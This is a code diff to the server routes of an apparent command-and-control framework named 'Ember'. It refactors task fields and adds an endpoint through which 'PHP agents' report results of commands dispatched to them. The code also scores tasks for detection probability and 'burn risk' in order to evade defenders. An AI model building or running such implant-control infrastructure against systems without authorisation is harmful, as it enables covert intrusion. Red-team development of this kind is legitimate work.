@@ -304,12 +304,12 @@ export function registerEmberBeaconRoutes(app: Express): void {
           const taskRows = await db.select().from(emberTasks).where(eq(emberTasks.taskId, result.taskId)).limit(1);
           if (taskRows.length > 0) {
             const task = taskRows[0];
-            const opsecActionType = TASK_OPSEC_MAP[task.taskType] || "command_execution";
+            const opsecActionType = TASK_OPSEC_MAP[task.type] || "command_execution";
 
             try {
               const opsecScore = await scoreActionRisk(
                 opsecActionType,
-                `Ember agent ${agentId} executed ${task.taskType}: ${task.commandJson || ""}`,
+                `Ember agent ${agentId} executed ${task.type}: ${JSON.stringify(task.params) || ""}`,
                 undefined,
                 undefined,
                 undefined,
@@ -317,7 +317,7 @@ export function registerEmberBeaconRoutes(app: Express): void {
 
               emitEmberOpsecScored({
                 agentId,
-                taskType: task.taskType,
+                taskType: task.type,
                 riskScore: opsecScore.riskScore,
                 riskLevel: opsecScore.riskLevel,
                 detectionProbability: opsecScore.detectionProbability,
@@ -326,7 +326,7 @@ export function registerEmberBeaconRoutes(app: Express): void {
               });
 
               emitOpsecActionScored({
-                action: `ember:${task.taskType}`,
+                action: `ember:${task.type}`,
                 riskScore: opsecScore.riskScore,
                 detectionTechnologies: opsecScore.detectedBy.map(d => d.technology),
                 mitigations: opsecScore.mitigations,
@@ -337,7 +337,7 @@ export function registerEmberBeaconRoutes(app: Express): void {
               emitEmberTaskComplete({
                 agentId,
                 taskId: result.taskId,
-                taskType: task.taskType,
+                taskType: task.type,
                 status: result.status,
                 engagementId: task.engagementId || undefined,
                 opsecRiskScore: opsecScore.riskScore,
@@ -349,15 +349,15 @@ export function registerEmberBeaconRoutes(app: Express): void {
                   type: "opsec_violation",
                   severity: "high",
                   title: `Ember OPSEC Burn Risk: ${agentId}`,
-                  description: `Task ${task.taskType} on agent ${agentId} has high burn risk (score: ${opsecScore.riskScore}). Detection probability: ${opsecScore.detectionProbability}%.`,
+                  description: `Task ${task.type} on agent ${agentId} has high burn risk (score: ${opsecScore.riskScore}). Detection probability: ${opsecScore.detectionProbability}%.`,
                   source: "ember-opsec",
                   recommendation: opsecScore.mitigations.join("; ") || "Consider reducing agent activity or rotating infrastructure.",
                 });
 
                 emitOpsecBurnDetected({
-                  indicator: `ember_task_${task.taskType}`,
+                  indicator: `ember_task_${task.type}`,
                   severity: opsecScore.riskScore >= 80 ? "critical" : "warning",
-                  description: `Ember agent ${agentId} task ${task.taskType} scored ${opsecScore.riskScore}/100 risk`,
+                  description: `Ember agent ${agentId} task ${task.type} scored ${opsecScore.riskScore}/100 risk`,
                   engagementId: task.engagementId || undefined,
                 });
               }
@@ -427,7 +427,7 @@ export function registerEmberBeaconRoutes(app: Express): void {
       if (pendingTasks.length > 0) {
         const taskIds = pendingTasks.map(t => t.taskId);
         await db.update(emberTasks)
-          .set({ status: "dispatched", dispatchedAt: now, updatedAt: now })
+          .set({ status: "sent" as any, sentAt: now })
           .where(inArray(emberTasks.taskId, taskIds));
       }
 
@@ -469,10 +469,10 @@ export function registerEmberBeaconRoutes(app: Express): void {
       const responsePayload = {
         tasks: pendingTasks.map(t => ({
           taskId: t.taskId,
-          type: t.taskType,
-          command: t.commandJson ? JSON.parse(t.commandJson) : null,
+          type: t.type,
+          command: typeof t.params === 'string' ? JSON.parse(t.params) : (t.params || {}),
           priority: t.priority,
-          timeoutMs: t.timeoutMs,
+          timeoutSeconds: t.timeoutSeconds || 300,
         })),
         rotationNeeded,
         burnResponse,
@@ -541,13 +541,13 @@ export function registerEmberBeaconRoutes(app: Express): void {
       const taskRows = await db.select().from(emberTasks).where(eq(emberTasks.taskId, resultData.taskId)).limit(1);
       if (taskRows.length > 0) {
         const task = taskRows[0];
-        const opsecActionType = TASK_OPSEC_MAP[task.taskType] || "command_execution";
-        const opsecScore = deterministicScoreActionRisk(opsecActionType, `Ember ${task.taskType} result`, 0);
+        const opsecActionType = TASK_OPSEC_MAP[task.type] || "command_execution";
+        const opsecScore = deterministicScoreActionRisk(opsecActionType, `Ember ${task.type} result`, 0);
 
         emitEmberTaskComplete({
           agentId,
           taskId: resultData.taskId,
-          taskType: task.taskType,
+          taskType: task.type,
           status: resultData.status,
           engagementId: task.engagementId || undefined,
           opsecRiskScore: opsecScore.riskScore,
@@ -699,7 +699,7 @@ export function registerEmberBeaconRoutes(app: Express): void {
       if (pendingTasks.length > 0) {
         const taskIds = pendingTasks.map(t => t.taskId);
         await db.update(emberTasks)
-          .set({ status: "dispatched", dispatchedAt: now, updatedAt: now })
+          .set({ status: "sent" as any, sentAt: now })
           .where(inArray(emberTasks.taskId, taskIds));
       }
 
@@ -720,9 +720,10 @@ export function registerEmberBeaconRoutes(app: Express): void {
         beaconCount,
         tasks: pendingTasks.map(t => ({
           taskId: t.taskId,
-          type: t.taskType,
-          command: t.commandJson ? JSON.parse(t.commandJson as string) : null,
+          type: t.type,
+          command: typeof t.params === 'string' ? JSON.parse(t.params) : (t.params || {}),
           priority: t.priority,
+          timeoutSeconds: t.timeoutSeconds || 300,
         })),
         nextBeaconMs: (agent.beaconInterval || 30) * 1000,
         serverTimestamp: now,
@@ -790,5 +791,72 @@ export function registerEmberBeaconRoutes(app: Express): void {
     }
   });
 
-  console.log("[Ember] Beacon routes registered: /api/ember/{register,beacon,result,rotate,health,terminate}");
+  // ── POST /api/ember/task-result ──────────────────────────────────────
+  // Plaintext task result submission for PHP agents
+  // Uses registrationToken for authentication
+  app.post("/api/ember/task-result", async (req: Request, res: Response) => {
+    try {
+      const { agentId, registrationToken, taskId, status, output, error: taskError, durationMs } = req.body;
+
+      if (!agentId || !registrationToken || !taskId) {
+        return res.status(400).json({ error: "Missing required fields" });
+      }
+
+      const db = await getDb();
+      const now = Date.now();
+
+      // Verify agent and token
+      const [agent] = await db.select().from(emberAgents)
+        .where(eq(emberAgents.agentId, agentId))
+        .limit(1);
+
+      if (!agent || agent.registrationToken !== registrationToken) {
+        return res.status(403).json({ error: "Invalid agent or token" });
+      }
+
+      // Find the task
+      const [task] = await db.select().from(emberTasks)
+        .where(and(
+          eq(emberTasks.taskId, taskId),
+          eq(emberTasks.agentId, agentId),
+        ))
+        .limit(1);
+
+      if (!task) {
+        return res.status(404).json({ error: "Task not found" });
+      }
+
+      // Update task with result
+      const finalStatus = status === "success" ? "success" : status === "failed" ? "failed" : "partial";
+      await db.update(emberTasks)
+        .set({
+          status: finalStatus as any,
+          output: output ? String(output).slice(0, 65000) : null,
+          error: taskError ? String(taskError).slice(0, 2000) : null,
+          durationMs: durationMs || null,
+          completedAt: now,
+        })
+        .where(eq(emberTasks.taskId, taskId));
+
+      // Emit task complete event
+      emitEmberTaskComplete({
+        agentId,
+        taskId,
+        taskType: task.type,
+        status: finalStatus,
+        engagementId: task.engagementId || undefined,
+        opsecRiskScore: 0,
+      });
+
+      console.log(`[Ember Task Result] Agent ${agentId} task ${taskId}: ${finalStatus}`);
+
+      return res.json({ status: "ok", taskId, recorded: true });
+
+    } catch (err: any) {
+      console.error("[Ember Task Result] Error:", err.message, err.stack);
+      return res.status(500).json({ error: "Failed to record task result" });
+    }
+  });
+
+  console.log("[Ember] Beacon routes registered: /api/ember/{register,beacon,result,rotate,health,heartbeat,task-result,terminate}");
 }
